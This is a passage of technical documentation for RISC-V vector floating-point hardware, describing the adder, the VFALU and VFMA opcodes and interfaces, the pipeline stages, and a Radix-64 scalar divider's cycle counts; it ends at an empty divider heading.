        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(f32 = f16 + f16\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(f32 = f16 + f32\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;Not allowed&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;The figure below shows the architecture of a scalar mixed-precision floating-point adder. The main difference is the addition of a fast format conversion module at the data input. Based on the operation type, this module converts the operands into the result's data format before processing, after which the computation flow is identical to that of a single-precision floating-point adder.&lt;/p&gt;
    &lt;head rend="h4"&gt;Vector Floating-Point Adder&lt;/head&gt;
    &lt;p&gt;The diagram below shows the architecture of the vector floating-point adder. To meet timing requirements, it is composed of four modules: \(FloatAdderF64Widen\) handles all operations with 64-bit output results, \(FloatAdderF32WidenF16\) handles all operations with 16-bit or 32-bit output results, and \(FloatAdderF16\) handles only operations with 16-bit output results.&lt;/p&gt;
    &lt;p&gt;Here, \(fp\_format\) is a 2-bit result format control signal: \(00\) indicates the result format is \(f16\), \(01\) indicates \(f32\), and \(10\) indicates \(f64\). The output flags are 20 bits, arranged with lower bits being significant. When the result format is \(f16\), all 20 bits are valid; for \(f32\), the lower 10 bits are valid; and for \(f64\), the lower 5 bits are valid.&lt;/p&gt;
    &lt;p&gt;The vector floating-point adder employs a two-stage pipeline design. To achieve rapid wake-up, the addition result is computed in approximately 1.5 cycles. Pipeline partitioning is performed within each submodule, requiring only the insertion of a single register level. Below is an explanation of the pipeline partitioning for the three modules shown in the diagram.&lt;/p&gt;
    &lt;p&gt;The diagram below illustrates the pipeline partitioning of the \(FloatAdderF64Widen\) module. The \(far\) path inserts registers after the significand right shift, while the \(close\) path inserts registers after the \(Mux1H\).&lt;/p&gt;
    &lt;p&gt;The figure below shows the pipeline division of the \(FloatAdderF32WidenF16\) module, which includes calculations for two different output formats. The selection logic in the second cycle is complex, so registers are inserted within the adder in the \(far\) path. The first cycle performs the addition of the lower \(18\) bits and the higher bits, while the second cycle combines the carry from the lower \(18\)-bit addition of the first cycle with the higher bits to obtain the final result. The \(close\) path also inserts registers after \(Mux1H\).&lt;/p&gt;
    &lt;p&gt;The following diagram shows the pipeline partitioning of the \(FloatAdderF16\) module. This module has minimal timing pressure and adopts a partitioning method where the \(far\) path inserts registers after the right shift of significant bits, and the \(close\) path inserts registers after \(Mux1H\).&lt;/p&gt;
    &lt;head rend="h4"&gt;Interface Description&lt;/head&gt;
    &lt;p&gt;The previously introduced vector floating-point adder has a width of \(64\) bits, requiring both operands to be in vector form. However, \(RVV\) not only specifies that both operands are in vector form (\(vector-vector\), abbreviated as \(vv\)) but also allows one operand to be a vector and the other a scalar (\(vector-scalar\), abbreviated as \(vf\)). Additionally, under \(widening\) instructions, the arrangement of source operands is not limited to the lower significant part. When the source register width is half of the destination register width, the data source may come from either the lower or upper half.&lt;/p&gt;
    &lt;p&gt;To implement all floating-point instruction calculations in \(RVV\) and support \(VLEN\) extension, simple instruction computations are added to the vector floating-point adder, transforming it into a vector floating-point "\(ALU\)", referred to as \(VFALU\).&lt;/p&gt;
    &lt;p&gt;Therefore, the vector floating-point adder needs to be modified to adapt to the features of \(RVV\). The modifications consist of two parts: functional modifications and interface modifications.&lt;/p&gt;
    &lt;p&gt;The table below lists the opcodes supported by \(VFALU\), totaling \(16\) operations, where (\(w\)) indicates operations involving \(widen\). The operand formats for \(vfmerge\), \(vfmove\), and \(vfclass\) are special: \(vfmerge.vfm\) has three source operands—a vector register, a floating-point register, and a \(mask\) register; \(vfmove.v.f\) has only one floating-point register as the source operand; \(vfclass\) has only one vector register as the source operand.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;\(op\_code\)&lt;/cell&gt;
        &lt;cell role="head"&gt;Corresponding instruction&lt;/cell&gt;
        &lt;cell role="head"&gt;Operand format&lt;/cell&gt;
        &lt;cell role="head"&gt;Meaning&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(vf(w)add\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;Addition&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(vf(w)sub\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;Subtraction&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(2\)&lt;/cell&gt;
        &lt;cell&gt;\(vfmin\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;Find the minimum value&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(3\)&lt;/cell&gt;
        &lt;cell&gt;\(vfmax\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;Find Maximum&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(4\)&lt;/cell&gt;
        &lt;cell&gt;\(vfmerge\)&lt;/cell&gt;
        &lt;cell&gt;\(vfm\)&lt;/cell&gt;
        &lt;cell&gt;Data merging&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(5\)&lt;/cell&gt;
        &lt;cell&gt;\(vfmove\)&lt;/cell&gt;
        &lt;cell&gt;\(v.f\)&lt;/cell&gt;
        &lt;cell&gt;Data movement&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(6\)&lt;/cell&gt;
        &lt;cell&gt;\(vfsgnj\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;Sign Injection&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(7\)&lt;/cell&gt;
        &lt;cell&gt;\(vfsgnjn\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;Sign inversion injection&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(8\)&lt;/cell&gt;
        &lt;cell&gt;\(vfsgnjx\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;XOR sign injection&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(9\)&lt;/cell&gt;
        &lt;cell&gt;\(vmfeq\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;Whether equal&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(10\)&lt;/cell&gt;
        &lt;cell&gt;\(vmfnq\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;Not Equal&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(11\)&lt;/cell&gt;
        &lt;cell&gt;\(vmflt\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;Whether it is less than&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(12\)&lt;/cell&gt;
        &lt;cell&gt;\(vmfle\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;Less than or equal to&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(13\)&lt;/cell&gt;
        &lt;cell&gt;\(vmfgt\)&lt;/cell&gt;
        &lt;cell&gt;\(vf\)&lt;/cell&gt;
        &lt;cell&gt;Whether greater than&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(14\)&lt;/cell&gt;
        &lt;cell&gt;\(vmfge\)&lt;/cell&gt;
        &lt;cell&gt;\(vf\)&lt;/cell&gt;
        &lt;cell&gt;Is greater than or equal to&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;15&lt;/cell&gt;
        &lt;cell&gt;\(vfclass\)&lt;/cell&gt;
        &lt;cell&gt;\(v\)&lt;/cell&gt;
        &lt;cell&gt;Classification&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;The table below defines the \(VFALU\) interface. Compared to the vector floating-point adder, it adds two mixed-precision data sources, \(widen\_a\) and \(widen\_b\). When the source and destination operand formats are the same, the data comes from \(fp\_a\) and \(fp\_b\); otherwise, it comes from \(widen\_a\) and \(widen\_b\). When \(uop\_idx=0\), the lower half is taken, and when \(uop\_idx=1\), the upper half is taken. When \(is\_frs1=1\), the source operand \(vs1\) comes from the floating-point register \(frs1\), which needs to be replicated into a vector register for computation. \(mask\) participates in the calculation of the \(merge\) instruction, and \(op\_code\) is the operation code indicating the operation to be performed.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Interface&lt;/cell&gt;
        &lt;cell role="head"&gt;Direction&lt;/cell&gt;
        &lt;cell role="head"&gt;Bit Width&lt;/cell&gt;
        &lt;cell role="head"&gt;Meaning&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;fp_a&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Source operand \(vs2\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(fp\_b\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Source operand \(vs1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(widen\_a\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;\(widen\_vs2\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(widen\_b\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;\(widen\_vs1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(frs1\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Floating-Point Register Data&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(is\_frs1\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Addend sourced from floating-point register data&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(mask\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(4\)&lt;/cell&gt;
        &lt;cell&gt;Participate in \(merge\) instruction computation&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(uop\_idx\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;Select upper/lower half when \(widen\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(round\_mode\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(3\)&lt;/cell&gt;
        &lt;cell&gt;Rounding mode&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(fp\_format\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(2\)&lt;/cell&gt;
        &lt;cell&gt;Floating-point format&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(res\_widening\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(widen\) instruction&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(opb\_widening\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;Is the source operand \(vs1\) in the same format as the result?&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(op\_code\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(5\)&lt;/cell&gt;
        &lt;cell&gt;Opcode&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;fp_result&lt;/cell&gt;
        &lt;cell&gt;\(output\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Computation result&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(fflags\)&lt;/cell&gt;
        &lt;cell&gt;\(output\)&lt;/cell&gt;
        &lt;cell&gt;\(20\)&lt;/cell&gt;
        &lt;cell&gt;Flag bits&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h3"&gt;Vector Floating-Point Fused Multiply-Add Unit&lt;/head&gt;
    &lt;head rend="h4"&gt;Pipeline Partitioning&lt;/head&gt;
    &lt;p&gt;The vector floating-point fused multiply-adder adopts a four-stage pipeline design to achieve rapid wake-up, ensuring the multiply-add result is computed in approximately \(3.5\) cycles. The vector unit's latency is \(3.5\) cycles. The diagram below illustrates the architecture of the vector floating-point fused multiply-adder, where \(reg\_0\) denotes the first-stage register, \(reg\_1\) the second-stage, and \(reg\_2\) the third-stage. The vector floating-point fused multiply-adder also supports \(widen\) functionality, limited to \(f32 = f16 × f16 + f32\) and \(f64 = f32 × f32 + f64\) cases. Thus, only a single-bit \(widen\) signal is needed for control when the output format is fixed. The output \(fflags\) is also \(20\) bits, consistent with the representation in the vector floating-point adder.&lt;/p&gt;
    &lt;p&gt;To save area while meeting timing constraints, a resource-sharing implementation is adopted. Calculations for all data formats use the same vector Booth encoder and CSA compression. By interleaving the layout, the 107-bit adder also achieves resource sharing.&lt;/p&gt;
    &lt;p&gt;In the first cycle, seven sets of exponent processing are performed to obtain seven right-shift values. The corresponding right-shift value is selected based on the computation format. For the right shifters, the \(f64\) right shifter is shared with one \(f32\), while a separate \(f32\) and four \(f16\) right shifters are dedicated. If subtraction is performed, the right-shifted result of \(fp\_c\)'s mantissa is inverted before being fed into the first-stage register. Simultaneously, vector \(Booth\) encoding is performed in the first cycle, generating 27 partial products, which are compressed into 4 partial products using \(CSA\) and then registered.&lt;/p&gt;
    &lt;p&gt;In the second cycle, compress the remaining 4 partial products using \(CSA4\_2\), then compress the result with the first cycle's right-shifted significand using \(CSA3\_2\). Perform a 107-bit addition and register the result in the second-stage register.&lt;/p&gt;
    &lt;p&gt;In the third cycle, the sum result from the second cycle undergoes \(lzd\) and \(tzd\), followed by a left shift with \(mask\) limitation. The shifted result is stored in the third-stage register.&lt;/p&gt;
    &lt;p&gt;In the fourth cycle, rounding is performed to obtain the mantissa result. The exponent result is calculated based on the left shift condition in the third cycle. The sign bit can be obtained from the \(107\)-bit adder in the second cycle. The flag results can generate four types of flags: overflow, underflow, invalid operation, and inexact. Note the method for detecting underflow. \(IEEE-754\) specifies two methods for detecting underflow: \(before \quad rounding\) and \(after \quad rounding\). This design uses the \(after \quad rounding\) method selected by \(RISC-V\) to detect underflow.&lt;/p&gt;
    &lt;head rend="h4"&gt;Interface Description&lt;/head&gt;
    &lt;p&gt;According to the \(RVV\) instruction definitions, vector floating-point fused multiply-add units can be reused for multiplication calculations, controlled by \(op\_code\). When performing multiplication, the internal adder is set to zero. Additionally, \(RVV\) defines a series of floating-point fused multiply-add instructions, primarily differing in sign bits and operand order. The vector floating-point fused multiply-add unit is modified to support all related instructions as \(VFMA\), with added \(op\_code\) and interfaces. The following table lists the \(VFMA\) opcodes, totaling \(9\) operations, all supporting \(vv\) and \(vf\) operand forms. For \(vf\), \(vs1[i]\) is replaced by the floating-point register \(frs1\).&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;\(op\_code\)&lt;/cell&gt;
        &lt;cell role="head"&gt;Corresponding instruction&lt;/cell&gt;
        &lt;cell role="head"&gt;Operand format&lt;/cell&gt;
        &lt;cell role="head"&gt;Meaning&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(vf(w)mul\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;\(vd[i] = vs[2] × vs1[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(vf(w)macc\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;\(vd[i] = +(vs1[i] × vs2[i]) + vd[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(2\)&lt;/cell&gt;
        &lt;cell&gt;\(vf(w)nmacc\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;\(vd[i] = -(vs1[i] × vs2[i]) - vd[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(3\)&lt;/cell&gt;
        &lt;cell&gt;\(vf(w)msac\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;\(vd[i] = +(vs1[i] × vs2[i]) - vd[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(4\)&lt;/cell&gt;
        &lt;cell&gt;\(vf(w)nmsac\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;\(vd[i] = -(vs1[i] × vs2[i]) + vd[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(5\)&lt;/cell&gt;
        &lt;cell&gt;\(vfmadd\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;\(vd[i] = +(vs1[i] × vd[i]) + vs2[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(6\)&lt;/cell&gt;
        &lt;cell&gt;\(vfnamdd\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;\(vd[i] = -(vs1[i] × vd[i]) - vs2[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(7\)&lt;/cell&gt;
        &lt;cell&gt;\(vfmsub\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;\(vd[i] = +(vs1[i] × vd[i]) - vs2[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(8\)&lt;/cell&gt;
        &lt;cell&gt;\(vfnmsub\)&lt;/cell&gt;
        &lt;cell&gt;\(vv,vf\)&lt;/cell&gt;
        &lt;cell&gt;\(vd[i] = -(vs1[i] × vd[i]) + vs2[i]\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;The table below shows the \(VFMA\) interface. To simplify control logic complexity, the three operands sent to \(VFMA\) are fixed in the order \(vs2\), \(vs1\), \(vd\). The functional unit internally adjusts the order based on \(op\_code\). Since the \(fma\) instruction uses a fixed target format for the addend during \(widen\), only \(widen\_a\) and \(widen\_b\) need to be added. \(uop\_idx\) is similarly used to select the upper or lower half of \(widen\_a\) and \(widen\_b\). \(frs1\) and \(is\_frs1\) are used to support \(vf\) instructions.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Interface&lt;/cell&gt;
        &lt;cell role="head"&gt;Direction&lt;/cell&gt;
        &lt;cell role="head"&gt;Bit Width&lt;/cell&gt;
        &lt;cell role="head"&gt;Meaning&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;fp_a&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Source operand \(vs2\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(fp\_b\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Source operand \(vs1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(fp\_c\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Source operand \(vd\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(widen\_a\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;\(widen\_vs2\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(widen\_b\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;\(widen\_vs1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(frs1\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Floating-Point Register Data&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(is\_frs1\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Addend sourced from floating-point register data&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(uop\_idx\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;Select upper/lower half when \(widen\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(round\_mode\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(3\)&lt;/cell&gt;
        &lt;cell&gt;Rounding mode&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(fp\_format\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(2\)&lt;/cell&gt;
        &lt;cell&gt;Floating-point format&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(res\_widening\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(widen\) instruction&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(op\_code\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(5\)&lt;/cell&gt;
        &lt;cell&gt;Opcode&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;fp_result&lt;/cell&gt;
        &lt;cell&gt;\(output\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Computation result&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(fflags\)&lt;/cell&gt;
        &lt;cell&gt;\(output\)&lt;/cell&gt;
        &lt;cell&gt;\(20\)&lt;/cell&gt;
        &lt;cell&gt;Flag bits&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h3"&gt;Vector floating-point divider&lt;/head&gt;
    &lt;head rend="h4"&gt;Scalar Floating-Point Divider&lt;/head&gt;
    &lt;p&gt;The scalar floating-point divider supports computations in three formats: \(1\) \(f16 = f16 / f16\), \(1\) \(f32 = f32 / f32\), and \(1\) \(f64 = f64 / f64\). The divider employs a \(Radix-64\) algorithm, where the iterative module performs three \(Radix-4\) iterations per cycle to achieve \(Radix-64\). The figure below shows the architecture of the scalar floating-point divider. The divider operates in a blocking manner and cannot accept the next division operation during computation, requiring handshake signals for control. This design uses \(start-valid\) handshake signals. Since the \(CPU\) may encounter branch prediction failures that flush pipeline states, a dedicated \(flush\) signal is included to clear the divider's internal state, allowing it to immediately start a new division operation in the next cycle.&lt;/p&gt;
    &lt;p&gt;Input data falls into three categories: both are normalized numbers (excluding divisors that are powers of \(2\)), at least one is a denormal number, and early termination (input contains \(NaN\), infinity, zero, or the divisor is a power of \(2\)). Results fall into two categories: the result is a normalized number, or the result is a denormal number.&lt;/p&gt;
    &lt;p&gt;When the inputs are all normalized numbers (excluding divisors that are powers of 2), the mantissas are normalized, and the process directly proceeds to the pre-scaling stage. When at least one input is a denormalized number, compared to the case where all inputs are normalized, an additional cycle is required for mantissa normalization before pre-scaling.&lt;/p&gt;
    &lt;p&gt;The prescaling stage takes one cycle, followed by integer quotient selection, where the two-bit integer quotient result is selected, and the prescaled divisor, dividend, and remainder's carry-save redundant representation are provided for the \(Radix-4\) iteration. The \(Radix-4\) iteration module calculates 6 bits of the quotient per cycle. \(f16\) division requires 2 cycles of \(Radix-4\) iteration, \(f32\) division requires 6 cycles, and \(f64\) division requires 9 cycles. After \(Radix-4\) iteration, the resulting mantissa quotient ranges between \((1, 2)\). When the result is a normalized number, only one cycle is needed for rounding and exponent result calculation to obtain the final division result. When the result is a denormal number, an additional cycle is required to denormalize the quotient before rounding.&lt;/p&gt;
    &lt;p&gt;Early termination is divided into two scenarios: (1) When the input operands contain NaN, infinity, or zero, division computation is unnecessary, and the result can be output in the second cycle. (2) When the divisor is a power of 2, the exponent result can be obtained in the first cycle. If the result does not require denormalization steps, it can be output in the second cycle; if denormalization is needed, an additional cycle is required, and the result is output in the third cycle.&lt;/p&gt;
    &lt;p&gt;The table below shows the required computation cycles for scalar dividers under different data formats, where \(+1\) indicates an additional cycle for post-processing when the division result is denormalized. In early termination cases, division operations for all data formats can be completed in just \(1\) to \(2\) cycles. Without early termination, \(f16\) division requires \(5\) to \(7\) cycles, \(f32\) division requires \(7\) to \(9\) cycles, and \(f64\) division requires \(12\) to \(14\) cycles.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Data Format&lt;/cell&gt;
        &lt;cell role="head"&gt;Normalized Number&lt;/cell&gt;
        &lt;cell role="head"&gt;Denormal number&lt;/cell&gt;
        &lt;cell role="head"&gt;Early termination&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(f16\)&lt;/cell&gt;
        &lt;cell&gt;\(5+1\)&lt;/cell&gt;
        &lt;cell&gt;\(6+1\)&lt;/cell&gt;
        &lt;cell&gt;\(1+1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(f32\)&lt;/cell&gt;
        &lt;cell&gt;\(7+1\)&lt;/cell&gt;
        &lt;cell&gt;\(8+1\)&lt;/cell&gt;
        &lt;cell&gt;\(1+1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(f64\)&lt;/cell&gt;
        &lt;cell&gt;\(12+1\)&lt;/cell&gt;
        &lt;cell&gt;\(13+1\)&lt;/cell&gt;
        &lt;cell&gt;\(1+1\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h4"&gt;Vector floating-point divider&lt;/head&gt;
